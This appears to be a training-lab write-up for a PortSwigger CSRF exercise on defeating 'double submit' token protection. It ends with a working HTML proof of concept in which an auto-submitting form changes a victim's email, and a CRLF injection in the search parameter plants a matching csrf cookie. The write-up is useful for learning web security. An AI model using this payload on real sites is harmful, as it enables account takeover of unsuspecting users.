
# CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-token-validation



![img](images/CSRF%20where%20token%20is%20duplicated%20in%20cookie/1.png)

---------------------------------------------

We find the CSRF token value in the POST parameter and the Cookie HTTP header, with the same value:



![img](images/CSRF%20where%20token%20is%20duplicated%20in%20cookie/2.png)

Using a random value, it still works:



![img](images/CSRF%20where%20token%20is%20duplicated%20in%20cookie/3.png)


The search function uses again the LastSearchTerm parameter with the last searched term:



![img](images/CSRF%20where%20token%20is%20duplicated%20in%20cookie/4.png)


We will update the PoC from the previous lab:

```
 <form action="https://0ab500c8032ce2a580584e1000e20095.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="tes1t1&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="test" />
      <input type="submit" value="Submit request" />
    </form>
<img src="https://0ab500c8032ce2a580584e1000e20095.web-security-academy.net/?search=abc%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None" onerror="document.forms[0].submit();"/>

```


